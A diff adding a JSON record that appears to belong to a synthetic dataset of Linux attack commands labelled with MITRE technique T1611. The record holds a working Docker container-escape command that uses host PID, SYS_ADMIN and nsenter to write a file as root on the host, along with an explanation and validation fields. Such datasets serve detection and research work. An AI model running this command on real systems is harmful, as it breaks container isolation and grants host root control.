@@ -1,0 +1,21 @@
+{
+  "id": "SYN-BASH-T1611-d4045100-3ad95681",
+  "technique_id": "T1611",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "docker run --pid=host --cap-add=SYS_ADMIN --rm debian nsenter -t 1 -m -u -n -i sh -c 'echo pwned > /root/pwned.txt'",
+  "explanation": "Uses nsenter with SYS_ADMIN capabilities within a Docker container to enter the host's namespaces and create a file in the root directory, demonstrating unauthorized access and manipulation.",
+  "rationale_steps": [
+    "Enter the host's different namespaces using enhanced capabilities.",
+    "Create a file in the root directory as evidence of control."
+  ],
+  "source_prompt_hash": "d4045100",
+  "obfuscation_level": "none",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  },
+  "timestamp_utc": "2025-07-07T00:26:37.904929Z"
+}
